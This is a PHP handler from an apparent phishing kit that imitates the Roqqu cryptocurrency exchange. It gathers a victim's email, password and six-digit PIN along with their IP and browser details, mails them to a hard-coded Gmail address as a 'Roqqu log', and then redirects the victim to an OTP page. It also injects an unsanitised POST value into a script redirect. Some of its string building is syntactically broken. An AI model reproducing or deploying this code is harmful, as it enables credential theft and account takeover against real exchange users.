<?php
session_start();

$_SESSION['pin'] = $_POST['pin1'].$_POST['pin2'].$_POST['pin3'].$_POST['pin4'].$_POST['pin5'].$_POST['pin6'];

include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST')
{ 
    $ip = getenv("REMOTE_ADDR");
   $subject = "Roqqu log";
    $to = "madumeresantus@gmail.com";  
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $data = "email  : " .$_SESSION['email']."\n".
            "password : " .$_SESSION['password']."\n".
            "pin:" .$_SESSION['pin']."\n".
            "IP : ".$ip."\n";$IP=$_POST['IP'];
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
            "User Agent:".$user_agent."\n".
            "OS:".Operating_System($user_agent)."\n".
            "Browser:".Browser($user_agent)."\n".
            "Device:".Device($user_agent)."\n".
            "IP:".GetIP()."\n".
  
    $message = $data ;  
                                  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('../././websites/otp.html');</script>";
?>
